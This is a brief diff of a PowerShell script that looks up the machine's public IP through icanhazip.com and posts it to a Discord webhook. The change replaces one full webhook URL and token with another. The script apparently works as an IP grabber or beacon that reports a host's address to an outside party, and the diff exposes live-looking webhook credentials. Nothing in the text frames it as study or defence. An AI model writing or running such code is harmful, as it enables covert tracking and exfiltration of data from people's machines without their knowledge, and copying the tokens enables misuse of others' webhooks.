@@ -2,7 +2,7 @@
 $ip = (Invoke-WebRequest -Uri "http://icanhazip.com").Content.Trim()
 
 # Discord Webhook URL
-$webhookUrl = "https://discord.com/api/webhooks/1319623653083713556/NtqHmApwZrKPMbEyAxGt3Rgg7ZeGcFWDE8cTaPqqESrjFEpAXCJFYzSxJJLyp7gXDyP-"
+$webhookUrl = "https://discord.com/api/webhooks/1326164102430724161/wA73oSHytoHTie7FnbZCz4tetoE-AJkvemVg_JqZfrSObQHJfTFBnOA_4XRbIenjYUxi"
 
 # Send IP address to Discord Webhook
 $headers = @{
